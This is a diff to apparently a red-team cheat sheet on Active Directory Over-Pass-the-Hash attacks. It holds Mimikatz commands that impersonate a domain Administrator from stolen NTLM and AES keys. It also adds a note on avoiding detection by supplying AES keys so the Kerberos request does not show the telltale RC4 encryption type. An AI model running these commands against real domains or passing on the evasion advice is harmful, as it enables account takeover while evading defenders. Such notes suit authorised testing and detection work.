@@ -119,3 +119,13 @@ Abusing kerberos functionality we can execute commands as another user by only k
 ```powershell
 Invoke-Mimikatz -Command '"sekurlsa::pth /usr:Administrator /domain:corp.local /ntlm:<ntlmhash> /run:powershell.exe"'
 ```
+
+> **RedTeam Note**: There is a different in encryption type for timestamp between a normal `krb-as-req` and one using the Over-Pass-the-hash `krb-as-req`
+> * Over-Pass-the-hash krb-as-req etype flag: `eTYPE-ARCFOUR-HMAC-MD5 (23)`
+> * Normal krb-as-req etype flag: `eTYPE-AES256-CTS-HMAC-SHA1-96 (18)`
+>
+> To reduce the cahnces of detection use `aes256`, `aes128` and `NTLM(RC4)` together.
+
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::pth /usr:Administrator /domain:corp.local /aes256:<aes256> /aes128:<aes128> /ntlm:<ntlmhash> /run:powershell.exe"'
+```
